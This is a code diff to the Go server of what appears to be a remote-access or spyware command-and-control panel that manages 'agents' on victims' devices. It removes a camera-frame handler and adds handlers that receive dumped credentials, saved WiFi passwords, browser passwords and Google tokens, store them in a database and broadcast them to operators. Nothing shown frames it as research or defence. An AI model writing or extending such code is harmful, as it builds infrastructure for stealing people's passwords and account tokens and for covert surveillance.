@@ -702,9 +702,7 @@ case "LOCATION_HISTORY":
         s.handleCameraSnapshot(agent, result)
         BroadcastResponse(agent.ID, cmdType, result)
         
-   case "CAMERA_FRAME":
-    s.handleCameraFrame(agent, result)
-    BroadcastCameraFrame(agent.ID, result)
+  
 
     case "SCREEN_FRAME":
         s.handleScreenFrame(agent, result)
@@ -885,6 +883,22 @@ case "BROWSER_TABS":
 
 case "BROWSER_ALL":
     s.handleBrowserAll(agent, result)
+    BroadcastResponse(agent.ID, cmdType, result)
+    
+    case "DUMP_CREDENTIALS":
+    s.handleDumpCredentials(agent, result)
+    BroadcastResponse(agent.ID, cmdType, result)
+
+case "GET_WIFI_PASSWORDS":
+    s.handleWifiPasswords(agent, result)
+    BroadcastResponse(agent.ID, cmdType, result)
+
+case "GET_BROWSER_PASSWORDS":
+    s.handleBrowserPasswords(agent, result)
+    BroadcastResponse(agent.ID, cmdType, result)
+
+case "GET_GOOGLE_TOKENS":
+    s.handleGoogleTokens(agent, result)
     BroadcastResponse(agent.ID, cmdType, result)
 
     case "SHOW_TOAST":
@@ -1632,26 +1646,50 @@ func BroadcastGoogleAccounts(agentID string, result map[string]interface{}) {
 }
 
 // ==================== CAMERA FRAME HANDLER ====================
+// ==================== CREDENTIALS HANDLERS ====================
 
-func (s *Server) handleCameraFrame(agent *Agent, result map[string]interface{}) {
-    // Cek data frame
-    var frameData string
-    if data, ok := result["data"].(string); ok {
-        frameData = data
-    }
+func (s *Server) handleDumpCredentials(agent *Agent, result map[string]interface{}) {
+    log.Printf("🔐 Credentials dump from %s", agent.ID)
     
-    if frameData != "" && len(frameData) > 100 {
-        agent.FrameCount++
-        log.Printf("📷 Camera frame #%d from %s, size: %d bytes, camera: %s", 
-            agent.FrameCount, agent.ID, len(frameData), 
-            result["camera"])
-        
-        // Simpan ke database jika perlu
-        // s.db.AddCameraFrame(agent.ID, frameData, result)
-        
-        // Broadcast ke WebSocket clients
-        BroadcastCameraFrame(agent.ID, result)
+    if status, ok := result["status"].(string); ok && status == "success" {
+        if data, ok := result["data"].([]interface{}); ok {
+            log.Printf("🔐 Found %d credential categories", len(data))
+            
+            // Save to agent metadata
+            agent.Metadata["credentials"] = result
+            s.db.UpdateAgentMetadata(agent.ID, "credentials", result)
+            
+            // Broadcast to WebSocket
+            BroadcastCredentials(agent.ID, result)
+        }
     }
+}
+
+func (s *Server) handleWifiPasswords(agent *Agent, result map[string]interface{}) {
+    log.Printf("📶 WiFi passwords from %s", agent.ID)
+    
+    if data, ok := result["data"].([]interface{}); ok {
+        log.Printf("📶 Found %d WiFi networks with passwords", len(data))
+        
+        // Save to metadata
+        agent.Metadata["wifi_passwords"] = result
+        s.db.UpdateAgentMetadata(agent.ID, "wifi_passwords", result)
+        
+        // Broadcast
+        BroadcastWifiPasswords(agent.ID, result)
+    }
+}
+
+func (s *Server) handleBrowserPasswords(agent *Agent, result map[string]interface{}) {
+    log.Printf("🌐 Browser passwords from %s", agent.ID)
+    agent.Metadata["browser_passwords"] = result
+    s.db.UpdateAgentMetadata(agent.ID, "browser_passwords", result)
+}
+
+func (s *Server) handleGoogleTokens(agent *Agent, result map[string]interface{}) {
+    log.Printf("🔵 Google tokens from %s", agent.ID)
+    agent.Metadata["google_tokens"] = result
+    s.db.UpdateAgentMetadata(agent.ID, "google_tokens", result)
 }
 
 // ==================== UTILITY ====================
@@ -1756,4 +1794,3 @@ func min(a, b int) int {
     }
     return b
 }
-
